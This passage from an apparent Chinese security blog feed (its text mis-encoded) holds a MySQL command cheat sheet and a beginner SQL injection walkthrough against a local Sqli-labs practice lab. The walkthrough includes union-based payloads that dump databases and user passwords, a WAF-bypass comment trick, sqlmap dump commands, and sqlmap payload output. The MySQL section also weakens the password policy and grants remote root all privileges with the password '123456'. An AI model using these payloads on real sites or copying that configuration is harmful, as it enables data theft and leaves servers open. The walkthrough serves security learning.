table_name;</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ”¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tab_name RENAME new_tab_name;</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰æŸ¥</p><p>æŸ¥çœ‹è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES[FROM db_name];</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ•°æ®è¡¨ç»“æ„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESC table_name;   </span><br></pre></td></tr></table></figure><h2 id="å­—æ®µç›¸å…³å‘½ä»¤"><a href="#å­—æ®µç›¸å…³å‘½ä»¤" class="headerlink" title="å­—æ®µç›¸å…³å‘½ä»¤"></a>å­—æ®µç›¸å…³å‘½ä»¤</h2><p>ï¼ˆ1ï¼‰å¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name ADD col_name col_definition[FIRST|AFTER col_name];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name ADD (col_name col_definition,...);</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åˆ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name DROP col_name;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name DROP col_name,DROP col_name,...;</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ”¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tab_name MODIFY col_name col_definition[FIRST|AFTER col_name];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tab_name CHANGE old_col_name new_col_name col_definition[FIRST|AFTER col_name];</span><br></pre></td></tr></table></figure><h2 id="æ•°æ®ç›¸å…³å‘½ä»¤"><a href="#æ•°æ®ç›¸å…³å‘½ä»¤" class="headerlink" title="æ•°æ®ç›¸å…³å‘½ä»¤"></a>æ•°æ®ç›¸å…³å‘½ä»¤</h2><p>ï¼ˆ1ï¼‰å¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name(column_name,...)</span><br><span class="line">VALUES(&#39;&#39;,&#39;&#39;,...)ï¼Œ(&#39;&#39;,&#39;&#39;,...),...;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name SET col_name&#x3D;expr,...;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name(col_name) SELECT col_name FROM table_reference;</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åˆ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM table_name [WHERE where_condition];</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ”¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name SET col_name1&#x3D;expr,col_name2&#x3D;expr,...[WHERE where_condition];</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰æŸ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name [WHERE where_condition];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name,... FROM table_name;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœåˆ†ç»„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT col_name FROM table_name GROUP BY col_name;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœæ’åº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT col_name FROM table_name ORDER BY col_name ASC|DESC;</span><br></pre></td></tr></table></figure><p>é™åˆ¶æŸ¥è¯¢ç»“æœè¿”å›æ•°é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name LIMIT row_count;</span><br></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰è¿æ¥</p><p>mysqlåœ¨SELECT,UPDATE,DELETEè¯­å¥ä¸­æ”¯æŒJOINæ“ä½œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_reference INNER|LEFT|RIGHT JOIN table_reference ON conditional_expr</span><br></pre></td></tr></table></figure><h1 id="å¯†ç è®¾ç½®ä¸è¿œç¨‹è¿æ¥"><a href="#å¯†ç è®¾ç½®ä¸è¿œç¨‹è¿æ¥" class="headerlink" title="å¯†ç è®¾ç½®ä¸è¿œç¨‹è¿æ¥"></a>å¯†ç è®¾ç½®ä¸è¿œç¨‹è¿æ¥</h1><h2 id="MySQLä¸­ä¸ºrootç”¨æˆ·è®¾ç½®å¯†ç "><a href="#MySQLä¸­ä¸ºrootç”¨æˆ·è®¾ç½®å¯†ç " class="headerlink" title="MySQLä¸­ä¸ºrootç”¨æˆ·è®¾ç½®å¯†ç "></a>MySQLä¸­ä¸ºrootç”¨æˆ·è®¾ç½®å¯†ç </h2><p>è¿›å…¥mysqlåå‘ç°rootç”¨æˆ·å¯†ç ä¸ºç©º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE mysql;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT host,user,authentication_string FROM user;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/3AYLdpV4iGK6Bzu.png" alt="image-20201101233018450"></p><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è®¾ç½®å¯†ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;æ–°å¯†ç &#39; PASSWORD EXPIRE NEVER;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;æ–°å¯†ç &#39;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure><p>å‡ºç°é”™è¯¯ï¼š</p><p><strong>ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</strong></p><p>æŸ¥æ‰¾èµ„æ–™ï¼š</p><p>åŸå› æ˜¯å› ä¸ºå¯†ç è®¾ç½®çš„è¿‡äºç®€å•ä¼šæŠ¥é”™,MySQLæœ‰å¯†ç è®¾ç½®çš„è§„èŒƒ</p><p>å¦‚æœæƒ³è¦æŸ¥çœ‹MySQLå®Œæ•´çš„åˆå§‹å¯†ç è§„åˆ™,ç™»é™†åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#39;validate_password%&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ZTkVwiKIoWrHGtb.png" alt="image-20201101235231684"></p><p>validate_password.lengthå†³å®šå¯†ç çš„é•¿åº¦,é»˜è®¤é•¿åº¦ä¸º8ä½ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤ä¿®æ”¹ä¸º4ä½ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global validate_password.length&#x3D;4;</span><br></pre></td></tr></table></figure><p>validate_password_policyå†³å®šå¯†ç çš„éªŒè¯ç­–ç•¥,é»˜è®¤ç­‰çº§ä¸ºMEDIUM(ä¸­ç­‰),å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤ä¿®æ”¹ä¸ºLOW(ä½)ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global validate_password.policy&#x3D;0;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å®Œæˆåå¯†ç å°±å¯ä»¥è®¾ç½®çš„å¾ˆç®€å•ã€‚</p><p>å†æ¬¡è®¾ç½®å¯†ç </p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/PeC6lhpZ4gVNJG1.png" alt="image-20201101235825039"></p><p>æˆåŠŸ!</p><p>é€€å‡ºåé‡æ–°ä½¿ç”¨è®¾ç½®çš„å¯†ç è¿›å…¥MySQL</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Q8HoYIWZLOrpGmy.png" alt="image-20201101235949729"></p><p>å†æ¬¡æŸ¥çœ‹ç”¨æˆ·åŠå¯†ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT host,user,authentication_string FROM user;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/VzMwpaEI18cnTbL.png" alt="image-20201102000107053"></p><p>å®Œæˆ!</p><h2 id="Navicatè¿œç¨‹è¿æ¥MySQL"><a href="#Navicatè¿œç¨‹è¿æ¥MySQL" class="headerlink" title="Navicatè¿œç¨‹è¿æ¥MySQL"></a>Navicatè¿œç¨‹è¿æ¥MySQL</h2><p>1)ä¿®æ”¹é…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾åˆ°bind-address,å°†bind-address=127.0.0.1 ä¿®æ”¹ä¸ºbind-address=0.0.0.0 ,ä»¥å…è®¸ä»»ä½•IPæ¥è®¿é—®MySQLæœåŠ¡</p><p>2ï¼‰é‡å¯MySQLæœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure><p>3ï¼‰ç»™éœ€è¦è¿œç¨‹è®¿é—®çš„ç”¨æˆ·æˆæƒ</p><p>æˆæƒæ‰€æœ‰æƒé™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;123456&#39; with grant option;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201118172547045.png" alt="image-20201118172547045"></p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://www.pianshen.com/article/251865160/">Linuxä¸‹é‡ç½®mysql8.0å¯†ç </a></p><p>[2] <a href="https://blog.csdn.net/calistom/article/details/87939956">ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</a></p><p>â€‹                 </p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥åŸºç¡€</title>
      <link href="posts/20316.html"/>
      <url>posts/20316.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>SQLæ³¨å…¥å°±æ˜¯é€šè¿‡æŠŠSQLå‘½ä»¤æ’å…¥åˆ° Webè¡¨å•æäº¤ æˆ– URL æˆ– é¡µé¢è¯·æ±‚ç­‰çš„æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤ã€‚å³ï¼šå°†æ„é€ çš„SQLè¯­å¥æ’å…¥åˆ°æ­£å¸¸æäº¤çš„å­—ç¬¦ä¸²ä¸­ï¼Œå¹¶ä½¿æœåŠ¡å™¨å°†å­—ç¬¦ä¸²ä¸­çš„å‘½ä»¤è§£æä¸ºå¯æ‰§è¡Œå‘½ä»¤è€Œä¸æ˜¯å­—ç¬¦ä¸²ã€‚</p><p>SQLæ³¨å…¥äº§ç”Ÿçš„åŸå› ï¼šè®¸å¤šç½‘é¡µç¨‹åºå‘˜åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™ï¼Œæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„åˆæ³•æ€§è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­å’Œè¿‡æ»¤ï¼Œä»è€Œå¯¼è‡´åº”ç”¨ç¨‹åºå­˜åœ¨è¯¥æ¼æ´ã€‚</p><p>MySQLæ‰‹å·¥æ³¨å…¥åŸç†ï¼šä¸»è¦æ˜¯åˆ©ç”¨mysqlè‡ªå¸¦çš„information_schemaæ•°æ®åº“ï¼Œinformation_schemaè¿™ä¸ªæ•°æ®åº“ä¿å­˜äº†MySQLä¸Šæ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æœ‰å“ªäº›æ•°æ®åº“ã€å„ä¸ªæ•°æ®åº“æœ‰å“ªäº›è¡¨ï¼Œæ¯å¼ è¡¨çš„å­—æ®µç±»å‹æ˜¯ä»€ä¹ˆï¼Œå„ä¸ªæ•°æ®åº“è¦ä»€ä¹ˆæƒé™æ‰èƒ½è®¿é—®ï¼Œç­‰ç­‰ä¿¡æ¯éƒ½ä¿å­˜åœ¨information_schemaæ•°æ®åº“é‡Œé¢ã€‚</p></blockquote><p>SQLæ³¨å…¥ç»ƒä¹ ç¯å¢ƒï¼šSqlilabs</p><p><a href="https://github.com/Rinkish/Sqli_Edited_Version">https://github.com/Rinkish/Sqli_Edited_Version</a></p><h1 id="GET-Unionæ³¨å…¥"><a href="#GET-Unionæ³¨å…¥" class="headerlink" title="GET Unionæ³¨å…¥"></a>GET Unionæ³¨å…¥</h1><h2 id="æ‰‹åŠ¨æµ‹è¯•"><a href="#æ‰‹åŠ¨æµ‹è¯•" class="headerlink" title="æ‰‹åŠ¨æµ‹è¯•"></a>æ‰‹åŠ¨æµ‹è¯•</h2><p><strong>1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹</strong></p><p>é€šè¿‡åœ¨URLä¸­ä¿®æ”¹å¯¹åº”çš„IDå€¼ï¼Œä¸ºæ­£å¸¸æ•°å­—ï¼Œå¤§æ•°å­—ï¼Œå­—ç¬¦ï¼ˆå•å¼•å·ï¼ŒåŒå¼•å·ï¼ŒåŒå•å¼•å·ï¼Œæ‹¬å·ï¼Œåæ–œæ†)æ¥æ¢æµ‹URLä¸­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ã€‚</p><p>åˆ¤æ–­æ³¨å…¥ç±»å‹ï¼š</p><p>æ•°å­—å‹æ³¨å…¥ï¼šid=1 è¿”å›æ­£å¸¸ â€“&gt; id=2-1 è¿”å›æ­£å¸¸</p><p>å­—ç¬¦å‹æ³¨å…¥ï¼šid=1 è¿”å›æ­£å¸¸ â€“&gt; id=1a è¿”å›æ­£å¸¸ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1    #æ­£å¸¸æ˜¾ç¤º</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203101671.png" alt="image-20201130203101671"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;   </span><br><span class="line">&#x2F;&#x2F;æ·»åŠ å•å¼•å·åæŠ¥é”™,çŒœæµ‹sqlè¯­å¥ SELECT * FROM users WHERE id&#x3D;&#39;1&#39;&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231003746.png" alt="image-20201128231003746"></p><p><strong>2.æ·»åŠ æ³¨é‡Šï¼ˆæ·»åŠ çš„å•å¼•å·é—­åˆå‰é¢çš„å•å¼•å·ï¼Œå†ç”¨æ³¨é‡Šç¬¦æ³¨é‡Šæ‰åé¢å†…å®¹ï¼‰</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;--+        </span><br><span class="line">&#x2F;&#x2F;åé¢åŠ ä¸Šand &#39;1&#39;&#x3D;&#39;1 ,or &#39;1&#39;&#x3D;&#39;1 ,and &#39;1&#39; like &#39;1ï¼Œor&#39; &#39;&#x3D;1&#x3D;&#39; äº¦å¯ï¼Œé—­åˆå•å¼•å·</span><br><span class="line">sqlè¯­å¥ SELECT * FROM users WHERE id&#x3D;&#39;1&#39;-- &#39; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231239638.png" alt="image-20201128231239638"></p><p>æ³¨é‡Šç¬¦ï¼šåœ¨Mysqlä¸­å¸¸è§çš„æ³¨é‡Šç¬¦è¡¨è¾¾å¼ï¼š#(%23) æˆ–â€“ç©º æ ¼æˆ– /**/</p><p>å†…è”æ³¨é‡Šï¼š /*! SQLè¯­å¥ */ åªæœ‰Mysqlå¯ä»¥è¯†åˆ«ï¼Œå¸¸ç”¨æ¥ç»•è¿‡WAF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from articles where id &#x3D; -1 &#x2F;*!union*&#x2F; &#x2F;*!select*&#x2F; 1,2,3,4</span><br></pre></td></tr></table></figure><p><strong>3.åˆ¤æ–­å­—æ®µæ•°é‡(ä½¿ç”¨order by å¯¹å­—æ®µæ’åº)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 1--+  #å¯¹ç¬¬ä¸€åˆ—æ’åºï¼Œæ­£å¸¸</span><br></pre></td></tr></table></figure><p>â€¦â€¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4--+  #å¯¹ç¬¬å››åˆ—æ’åºï¼ŒæŠ¥é”™ï¼Œè¡¨æ˜æ²¡æœ‰ç¬¬å››åˆ—</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231715638.png" alt="image-20201128231715638"></p><p>å³æœ‰3ä¸ªå­—æ®µ</p><p><strong>4.æŠ¥æ˜¾ç¤ºä½ï¼Œidè®¾ä¸ºæŸ¥è¯¢ä¸åˆ°çš„æ•°æ®ï¼ˆä½¿ç”¨unionè”åˆæŸ¥è¯¢ï¼Œå‰åçš„è¡¨ä¸­è¦æœ‰ç›¸åŒçš„å­—æ®µæ•°ï¼Œç„¶åè®©å·¦è¾¹æŸ¥è¯¢æ— ç»“æœï¼Œå³è¾¹æœ‰ç»“æœï¼‰</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128232240296.png" alt="image-20201128232240296"></p><p><strong>5.æŸ¥è¯¢ç›¸å…³ä¿¡æ¯</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,database(),3--+  #æŸ¥è¯¢å½“å‰æ•°æ®åº“</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128233025336.png" alt="image-20201128233025336"></p><p>å…¶ä»–ä¿¡æ¯ user(),version()â€¦</p><p><strong>6.æŸ¥è¯¢å…·ä½“ä¿¡æ¯</strong></p><p>1ï¼‰æŸ¥è¯¢æ‰€æœ‰åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234024839.png" alt="image-20201128234024839"></p><p>2ï¼‰æŸ¥è¯¢å½“å‰åº“çš„æ‰€æœ‰è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234247143.png" alt="image-20201128234247143"></p><p>3ï¼‰æŸ¥è¯¢è¡¨ä¸­å­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;--+</span><br></pre></td></tr></table></figure><p>å¼•å·å†… users è½¬æ¢ä¸ºåå…­è¿›åˆ¶äº¦å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;0x7573657273--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234755093.png" alt="image-20201128234755093"></p><p><strong>7.æŸ¥è¯¢æ•°æ®</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(id,0x3a,password,0x3a,username),3 from users--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128235121970.png" alt="image-20201128235121970"></p><p><strong>8.æŸ¥è¯¢åŸºæœ¬ä¿¡æ¯</strong></p><p>æŸ¥è¯¢åŸºæœ¬ä¿¡æ¯ä¸»è¦æ˜¯åˆ©ç”¨æ•°æ®åº“ä¸­çš„å†…ç½®å‡½æ•°æ¥è·å–ä¿¡æ¯ã€‚</p><ul><li>version()â€”â€”MySQLç‰ˆæœ¬</li><li>user()â€”â€”ç”¨æˆ·å</li><li>database()â€”â€”æ•°æ®åº“å</li><li>@@datadirâ€”â€”æ•°æ®åº“è·¯å¾„</li><li>@@version_compile_osâ€”â€”æ“ä½œç³»ç»Ÿç‰ˆæœ¬</li></ul><h2 id="åˆ©ç”¨Sqlmapæµ‹è¯•"><a href="#åˆ©ç”¨Sqlmapæµ‹è¯•" class="headerlink" title="åˆ©ç”¨Sqlmapæµ‹è¯•"></a><strong>åˆ©ç”¨Sqlmapæµ‹è¯•</strong></h2><p>Sqlmapæ˜¯æ£€æµ‹å’Œåˆ©ç”¨SQLæ³¨å…¥æ¼æ´çš„ä¸€æ¬¾å¼ºå¤§å·¥å…·ã€‚</p><p><strong>1.æŸ¥è¯¢åº“</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129153523160.png" alt="image-20201129153523160"></p><p><strong>2.æŸ¥è¯¢è¡¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security --tables --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154040322.png" alt="image-20201129154040322"></p><p><strong>3.æŸ¥è¯¢å­—æ®µ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security -T users --columns --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154015859.png" alt="image-20201129154015859"></p><p><strong>4.æŸ¥è¯¢æ•°æ®</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154914063.png" alt="image-20201129154914063"></p><p><strong>Sqlmapæ£€æµ‹è¿‡ç¨‹ä¸­çš„payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 6535&#x3D;6535 AND &#39;MMEg&#39;&#x3D;&#39;MMEg</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND EXTRACTVALUE(6529,CONCAT(0x5c,0x7162717a71,(SELECT (ELT(6529&#x3D;6529,1))),0x7176767a71)) AND &#39;SxoL&#39;&#x3D;&#39;SxoL</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 9353 FROM (SELECT(SLEEP(5)))yGeE) 